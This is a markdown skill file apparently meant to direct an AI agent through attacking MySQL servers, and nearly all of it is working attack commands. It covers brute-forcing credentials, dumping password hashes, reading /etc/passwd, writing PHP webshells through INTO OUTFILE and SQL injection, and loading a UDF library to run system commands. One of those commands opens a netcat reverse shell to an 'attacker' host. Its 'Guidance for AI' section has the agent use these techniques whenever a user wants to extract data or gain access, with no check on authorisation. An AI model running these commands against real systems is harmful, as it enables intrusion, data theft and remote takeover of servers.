# MySQL Pentesting Skill

## Goal

Enumerate and exploit MySQL database services to extract data, gain command execution, and escalate privileges.

## Methodology

1. **Discovery**: Identify MySQL services and version
2. **Authentication Testing**: Check for default/weak credentials and anonymous access
3. **Enumeration**: List databases, tables, users, and privileges
4. **Data Extraction**: Dump sensitive data
5. **Privilege Escalation**: Exploit UDF or file permissions
6. **Command Execution**: Achieve RCE through various techniques

## Tools

* **mysql**: MySQL client
* **nmap**: MySQL scripts
* **hydra/medusa**: Credential brute-forcing
* **sqlmap**: SQL injection exploitation
* **Metasploit**: MySQL modules

## Example Commands

```bash
# Nmap enumeration
nmap -p3306 --script mysql-* target
nmap -p3306 --script mysql-info target
nmap -p3306 --script mysql-enum target
nmap -p3306 --script mysql-empty-password target
nmap -p3306 --script mysql-brute target

# Connect to MySQL
mysql -h target -u root -p
mysql -h target -u root  # Try empty password

# Check config for remote connections
# bind-address = 0.0.0.0 means remote access allowed

# Bruteforce credentials
hydra -l root -P /usr/share/wordlists/rockyou.txt target mysql
medusa -h target -u root -P /usr/share/wordlists/rockyou.txt -M mysql
```

## MySQL Enumeration

```sql
-- Version and info
SELECT version();
SELECT user();
SELECT database();
SELECT @@hostname;
SELECT @@datadir;
SELECT @@basedir;

-- List users and privileges
SELECT user,host,authentication_string FROM mysql.user;
SELECT * FROM mysql.user;
SHOW GRANTS;
SHOW GRANTS FOR 'root'@'localhost';

-- List databases
SHOW DATABASES;
SELECT schema_name FROM information_schema.schemata;

-- List tables
USE database_name;
SHOW TABLES;
SELECT table_name FROM information_schema.tables WHERE table_schema='database_name';

-- List columns
DESCRIBE table_name;
SELECT column_name FROM information_schema.columns WHERE table_name='users';

-- Password hashes
SELECT user,password FROM mysql.user;  -- Old versions
SELECT user,authentication_string FROM mysql.user;  -- MySQL 5.7+
```

## File Operations

```sql
-- Check file privileges
SELECT file_priv FROM mysql.user WHERE user='root';

-- Read files (requires FILE privilege)
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('C:\\Windows\\System32\\drivers\\etc\\hosts');

-- Write files (requires FILE privilege and secure_file_priv not set)
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';
SELECT "<?php system($_GET['cmd']); ?>" INTO DUMPFILE '/var/www/html/shell.php';

-- Check secure_file_priv (empty = no restriction)
SHOW VARIABLES LIKE 'secure_file_priv';
```

## User-Defined Functions (UDF) Exploitation

```bash
# Compile UDF library (on attacker machine)
# For Linux:
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc

# Upload to MySQL plugin directory
# Find plugin dir:
mysql> SHOW VARIABLES LIKE 'plugin_dir';

# Upload the library
mysql> SELECT LOAD_FILE('/tmp/raptor_udf2.so') INTO DUMPFILE '/usr/lib/mysql/plugin/raptor_udf2.so';

# Create function
mysql> CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'raptor_udf2.so';

# Execute commands
mysql> SELECT sys_exec('id > /tmp/out; chmod 777 /tmp/out');
mysql> SELECT sys_exec('nc -e /bin/sh attacker 4444');
```

## Metasploit Modules

```bash
# Version enumeration
use auxiliary/scanner/mysql/mysql_version

# Login bruteforce
use auxiliary/scanner/mysql/mysql_login

# Enumeration
use auxiliary/admin/mysql/mysql_enum
use auxiliary/scanner/mysql/mysql_hashdump

# SQL query execution
use auxiliary/admin/mysql/mysql_sql

# UDF injection
use exploit/multi/mysql/mysql_udf_payload
```

## SQL Injection to RCE

```sql
-- If you have SQL injection, try:

-- Read files
' UNION SELECT LOAD_FILE('/etc/passwd')--

-- Write webshell
' UNION SELECT "<?php system($_GET['c']); ?>" INTO OUTFILE '/var/www/html/shell.php'--

-- Into outfile variations
-- Try different paths: /var/www/, /var/www/html/, /srv/http/
```

## Password Cracking

```bash
# MySQL 4.1/5.x password hash format
# *2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19

# Crack with hashcat
hashcat -m 300 hashes.txt wordlist.txt

# Crack with John
john --format=mysql-sha1 hashes.txt
```

## Configuration Files

```bash
# Linux
/etc/mysql/my.cnf
/etc/my.cnf
/var/lib/mysql/my.cnf
~/.my.cnf

# Windows
C:\Windows\my.ini
C:\ProgramData\MySQL\MySQL Server 5.7\my.ini
```

## Default Credentials

| Username | Password |
|----------|----------|
| root | (empty) |
| root | root |
| root | mysql |
| root | toor |
| mysql | mysql |

## Guidance for AI

* Activate this skill when user wants to test MySQL security, extract data, or gain access through MySQL
* **Try empty password for root first**: `mysql -h target -u root`
* Check if remote connections are allowed (bind-address setting)
* FILE privilege allows reading/writing files - very dangerous
* UDF exploitation requires write access to plugin directory
* Look for credentials in:
  - Web application config files
  - Environment variables
  - .my.cnf files
* secure_file_priv restricts file operations - empty means no restriction
* MySQL password hashes are easily crackable
* MariaDB uses the same commands and techniques
